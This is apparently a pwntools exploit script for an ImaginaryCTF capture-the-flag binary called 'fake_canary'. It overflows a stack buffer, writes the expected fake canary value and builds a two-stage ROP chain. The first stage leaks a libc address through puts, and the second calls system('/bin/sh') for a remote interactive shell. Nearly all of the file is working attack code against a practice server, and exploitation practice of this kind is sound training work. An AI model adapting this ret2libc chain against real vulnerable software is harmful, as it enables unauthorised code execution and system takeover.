# Return to win() function => fail
# ROP to system(&"/bin/sh\x00") => fail

from pwn import *

debug = False

if debug == True:
    p = process('./fake_canary')
    e = ELF('./fake_canary')
    #gdb.attach(p)
else:
    p = remote('chal.imaginaryctf.org', 42002)

gadget = 0x4007a3 # pop rdi ; ret
puts_plt = 0x400550
puts_got = 0x601018
gets_got = 0x601028
main = 0x400687

# stage1 leak puts() address
payload = b'A' * (0x30 - 8)
payload += p64(0xDEADBEEF)
payload += b'A' * 8 # RBP
payload += p64(gadget)
#payload += p64(puts_got)
payload += p64(gets_got)
payload += p64(puts_plt)
payload += p64(main)

print(p.recvline())
print(p.recvline())

if debug == True:
    #raw_input('1')
    p.sendline(payload)
else:
    p.sendline(payload)

'''
libc6_2.31-0ubuntu9.1_amd64
libc6_2.31-0ubuntu9.2_amd64
libc6_2.31-0ubuntu9_amd64
'''
#print(p.recv(8))
leak_puts = u64(p.recv(6).ljust(8, b'\x00'))
#leak_gets = u64(p.recv(6).ljust(8, b'\x00'))
print('leak_puts : ' + hex(leak_puts))
#print('leak_gets : ' + hex(leak_gets))

puts_offset = 0x0875a0
libc_base = leak_puts - puts_offset
print('libc_base : ' + hex(libc_base))
system_offset = 0x055410
system = libc_base + system_offset
print('system : ' + hex(system))
binsh_offset = 0x1b75aa
binsh = libc_base + binsh_offset
print('str_bin_sh : ' + hex(binsh))

# stage2 system(&"/bin/sh\x00") call
print(p.recvline())
print(p.recvline())
print(p.recvline())

payload2 = b'A' * (0x30 - 8)
payload2 += p64(0xDEADBEEF)
payload2 += b'A' * 8 # RBP
payload2 += p64(gadget)
payload2 += p64(binsh)
payload2 += p64(system)

sleep(0.1)

p.sendline(payload2)

sleep(0.1)

p.interactive()